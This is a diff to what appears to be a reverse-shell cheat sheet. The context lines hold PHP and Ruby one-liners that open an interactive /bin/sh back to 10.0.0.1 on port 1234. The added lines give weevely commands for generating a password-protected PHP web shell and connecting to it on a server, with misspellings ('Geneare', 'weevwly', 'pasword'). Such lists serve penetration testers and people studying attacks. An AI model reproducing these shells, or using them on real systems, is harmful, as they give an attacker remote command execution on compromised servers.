@@ -19,6 +19,9 @@ https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/
 
 # Php
 - php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+- Geneare with weevwly
+	> weevely generate [pasword] [outputfile.php]	
+	> weevely [http://server-ip:port/outputfile.php] [pasword]
 
 # Ruby
 - ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
